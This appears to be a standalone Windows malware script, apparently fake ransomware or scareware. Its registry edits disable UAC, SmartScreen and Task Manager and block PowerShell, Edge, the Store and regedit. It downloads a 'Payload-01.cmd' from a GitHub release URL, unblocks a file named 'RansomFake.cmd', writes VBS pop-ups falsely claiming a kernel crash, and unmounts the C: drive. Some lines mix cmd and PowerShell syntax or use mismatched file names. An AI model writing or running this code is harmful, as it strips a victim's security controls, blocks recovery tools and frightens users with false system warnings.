reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /t REG_DWORD  /v "DisallowRun" /reg:32 /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /t REG_DWORD /v "SmartScreenEnabled" /reg:32 /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "1" /d "powershell.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "2" /d "run.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "3" /d "msedge.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "4" /d "MicrosoftEdge.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "5" /d "pwsh.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "6" /d "WinStore.App.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "7" /d "regedit.exe" /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /reg:32 /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /REG:32 /d 1
Cd "%UserProfile%\appdata\roaming\Microsoft\Windows\Start Menu\Programs"
mkdir "Startup"
invoke-webrequest -Uri "https://release-assets.githubusercontent.com/github-production-release-asset/1048403850/d393ccc5-9372-4946-9b82-8dd1e63efffd?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-09-20T19%3A46%3A20Z&rscd=attachment%3B+filename%3DPayload-01.cmd&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-09-20T18%3A46%3A00Z&ske=2025-09-20T19%3A46%3A20Z&sks=b&skv=2018-11-09&sig=VrTgr7%2BGZAd%2BTGX%2FBQRimbWUww90cpBefeYpJkMw7KU%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1ODM5NTcxMCwibmJmIjoxNzU4Mzk1NDEwLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ._tipdiKegtCWXgN8xIgLD0uSAshb0Jzg35MRmWJ0txE&response-content-disposition=attachment%3B%20filename%3DPayload-01.cmd&response-content-type=application%2Foctet-stream"
Unblock-File "RansomFake.cmd"
echo "MsgBox "Windows is in crash state and the kernel is unavalabile!" ^& vbCrLf ,(0), "78ftc3sa9"" > corruption.vbs
echo "MsgBox "turn off nowf avoiding any corruption!" ^& vbCrLf ,262192, "ctu4st6f"" > corruption.vbs 
mountvol C: /d





















